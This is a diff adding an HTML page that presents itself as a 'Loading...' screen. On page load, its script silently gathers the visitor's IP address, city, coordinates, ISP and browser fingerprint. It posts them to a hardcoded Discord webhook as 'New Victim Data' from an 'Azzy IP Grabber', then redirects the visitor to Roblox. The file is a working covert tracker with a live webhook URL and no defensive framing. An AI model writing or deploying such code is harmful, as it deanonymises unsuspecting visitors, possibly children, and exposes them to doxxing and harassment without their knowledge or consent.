@@ -1,0 +1,234 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            background: #000000;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            flex-direction: column;
+        }
+        .star {
+            color: #FFD700;
+            font-size: 120px;
+            line-height: 1;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+        #status {
+            color: #888;
+            font-size: 14px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="star">✡</div>
+    <div id="status"></div>
+
+    <script>
+        // ============================================================
+        // WEBHOOK URL - Consider moving to server-side for production
+        // ============================================================
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1570098238336405587/vqwNDqZrM-dREw1YvVFDeHJRRss0E17Quh9xAresRVVf_udqawTLQmZSPhRteb9uwMIm";
+
+        (function() {
+            // Collect browser data
+            function collectData() {
+                return {
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    screenWidth: window.screen.width,
+                    screenHeight: window.screen.height,
+                    screenColorDepth: window.screen.colorDepth,
+                    windowWidth: window.innerWidth,
+                    windowHeight: window.innerHeight,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    referrer: document.referrer || 'direct',
+                    pageURL: window.location.href,
+                    hostname: window.location.hostname,
+                    pathname: window.location.pathname
+                };
+            }
+
+            // ============================================================
+            // FIXED: Enhanced IP fetching with accurate IPv4 + geolocation
+            // ============================================================
+            function fetchIPInfo() {
+                // Primary: Get IPv4 via ipify, then get geolocation from ipapi
+                return fetch('https://api.ipify.org?format=json')
+                    .then(r => {
+                        if (!r.ok) throw new Error('ipify failed');
+                        return r.json();
+                    })
+                    .then(ipData => {
+                        if (!ipData.ip) throw new Error('No IP from ipify');
+                        // Now get geolocation using the detected IP
+                        return fetch('https://ipapi.co/' + ipData.ip + '/json/')
+                            .then(r => {
+                                if (!r.ok) throw new Error('ipapi geo failed');
+                                return r.json();
+                            })
+                            .then(geo => {
+                                return {
+                                    ip: ipData.ip,
+                                    country: geo.country_name || geo.country || 'unknown',
+                                    city: geo.city || 'unknown',
+                                    region: geo.region || 'unknown',
+                                    isp: geo.org || geo.isp || 'unknown',
+                                    timezone: geo.timezone || 'unknown',
+                                    latitude: geo.latitude || 'unknown',
+                                    longitude: geo.longitude || 'unknown'
+                                };
+                            });
+                    })
+                    .catch(() => {
+                        // Fallback 1: Try ipapi.co directly (may return IPv6 or IPv4)
+                        return fetch('https://ipapi.co/json/')
+                            .then(r => {
+                                if (!r.ok) throw new Error('ipapi direct failed');
+                                return r.json();
+                            })
+                            .then(d => {
+                                return {
+                                    ip: d.ip || 'unknown',
+                                    country: d.country_name || d.country || 'unknown',
+                                    city: d.city || 'unknown',
+                                    region: d.region || 'unknown',
+                                    isp: d.org || d.isp || 'unknown',
+                                    timezone: d.timezone || 'unknown',
+                                    latitude: d.latitude || 'unknown',
+                                    longitude: d.longitude || 'unknown'
+                                };
+                            });
+                    })
+                    .catch(() => {
+                        // Fallback 2: Try ipinfo.io
+                        return fetch('https://ipinfo.io/json')
+                            .then(r => {
+                                if (!r.ok) throw new Error('ipinfo failed');
+                                return r.json();
+                            })
+                            .then(d => {
+                                const loc = (d.loc || '0,0').split(',');
+                                return {
+                                    ip: d.ip || 'unknown',
+                                    country: d.country || 'unknown',
+                                    city: d.city || 'unknown',
+                                    region: d.region || 'unknown',
+                                    isp: d.org || 'unknown',
+                                    timezone: d.timezone || 'unknown',
+                                    latitude: loc[0] || 'unknown',
+                                    longitude: loc[1] || 'unknown'
+                                };
+                            });
+                    })
+                    .catch(() => {
+                        // Ultimate fallback: return unknown
+                        return {
+                            ip: 'unknown',
+                            country: 'unknown',
+                            city: 'unknown',
+                            region: 'unknown',
+                            isp: 'unknown',
+                            timezone: 'unknown',
+                            latitude: 'unknown',
+                            longitude: 'unknown'
+                        };
+                    });
+            }
+
+            // ============================================================
+            // Send to Discord webhook with @everyone ping
+            // ============================================================
+            function sendToDiscord(data, browserData) {
+                const embed = {
+                    title: "📡 New Victim Data",
+                    color: 0xFFD700,
+                    fields: [
+                        { name: "🌐 IP Address", value: data.ip || 'unknown', inline: true },
+                        { name: "📍 Country", value: data.country || 'unknown', inline: true },
+                        { name: "🏙️ City", value: data.city || 'unknown', inline: true },
+                        { name: "📡 ISP", value: data.isp || 'unknown', inline: true },
+                        { name: "🕒 Timezone", value: data.timezone || 'unknown', inline: true },
+                        { name: "🗺️ Coordinates", value: data.latitude + ', ' + data.longitude, inline: true },
+                        { name: "🖥️ Platform", value: browserData.platform || 'unknown', inline: true },
+                        { name: "🌍 Language", value: browserData.language || 'unknown', inline: true },
+                        { name: "📱 Screen", value: browserData.screenWidth + 'x' + browserData.screenHeight, inline: true },
+                        { name: "🧠 CPU Cores", value: String(browserData.hardwareConcurrency), inline: true },
+                        { name: "💾 RAM (GB)", value: String(browserData.deviceMemory), inline: true },
+                        { name: "🔗 Page URL", value: browserData.pageURL || 'unknown', inline: false },
+                        { name: "📎 Referrer", value: browserData.referrer || 'direct', inline: false },
+                        { name: "🆔 User Agent", value: browserData.userAgent || 'unknown', inline: false }
+                    ],
+                    footer: { text: "Azzy IP Grabber • " + browserData.timestamp }
+                };
+
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "@everyone look at this",
+                        embeds: [embed]
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('✅ Webhook sent successfully');
+                    } else {
+                        console.error('❌ Webhook error:', response.status);
+                        // Try to log the error
+                        response.text().then(t => console.error('Response:', t));
+                    }
+                })
+                .catch(error => console.error('❌ Fetch error:', error));
+            }
+
+            // ============================================================
+            // Execute - Get accurate IP then send
+            // ============================================================
+            const browserData = collectData();
+            
+            fetchIPInfo().then(ipData => {
+                // Merge browser data with IP data
+                const fullData = { ...browserData, ...ipData };
+                sendToDiscord(fullData, browserData);
+                
+                // Show status briefly
+                const statusEl = document.getElementById('status');
+                statusEl.style.display = 'block';
+                statusEl.textContent = '✓ Data captured. Redirecting...';
+                statusEl.style.color = '#4CAF50';
+                
+                // Redirect to Roblox after 2.5 seconds
+                setTimeout(() => {
+                    window.location.replace("https://www.roblox.com");
+                }, 2500);
+            });
+
+        })();
+    </script>
+</body>
+</html>
